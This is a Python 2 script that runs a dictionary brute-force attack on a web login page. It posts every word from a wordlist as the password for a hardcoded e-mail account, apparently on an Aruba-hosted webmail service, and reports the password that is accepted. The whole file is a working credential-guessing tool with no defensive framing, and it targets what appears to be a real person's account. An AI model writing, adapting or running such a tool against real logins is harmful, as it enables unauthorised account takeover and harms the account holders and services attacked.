#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python brute-force-dictionary.py --dictionary wordlist.txt --url http://www.somedomain.com/Login

#import the necessary packages
import argparse
import json
import requests
import string

# construct the argument parse and parse the arguments
arguments = argparse.ArgumentParser()
arguments.add_argument("-d", "--dictionary", required=True,
    help="Path to the dictionary")

arguments.add_argument("-u", "--url", required=True,
    help="Url ")


def parseToJsonString(data):
    parseString = ""

    parseString = string.replace(data, 'status', '\"status\"')
    parseString = string.replace(parseString, 'err_code', '\"err_code\"')
    parseString = string.replace(parseString, 'err_text', '\"err_text\"')
    parseString = string.replace(parseString, 'url', '\"url\"')

    # print parseString
    return parseString

args = vars(arguments.parse_args())

wordlist = open(args["dictionary"])

#
for word in wordlist.readlines():

    # headers = {'content-type': 'application/json'}
    # headers = {'content-type': 'text/html; charset=utf-8'}
    headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    url = args["url"]

    data = {
        'login': 'grafica@imaginecreative.it',
        'password': word.strip("\n"),
        'lang': 'en',
        'theme': 'ext_aruba/classic'
    }

    r = requests.post(url, data=data, headers=headers)
    # print "[INFO] \n\n"
    # print r.status_code
    # print "\n\n"
    # print r.headers
    # print "\n\n"
    # print r.text

    # jsonString = '{"status":{"err_code":1,"err_text":"Failure during authentication!"},"url":""}'
    jsonString = parseToJsonString(r.text)

    try:
        decoded = json.loads(jsonString)

        # pretty printing of json-formatted string
        # print json.dumps(decoded, sort_keys=True, indent=4)

        # print "JSON parsing example: ", decoded['status']['err_code']
        # print "Complex JSON parsing example: ", decoded['url']

        if decoded['status']['err_code'] == 0:
            print "Authorized with password: %s" %(word.strip("\n"))
            print "Authorized url: %s\n" %(decoded['url'])
            break
        else:
            print "Unauthorized with password: %s\n" %(word.strip("\n"))

    except (ValueError, KeyError, TypeError):
        print "JSON format error"
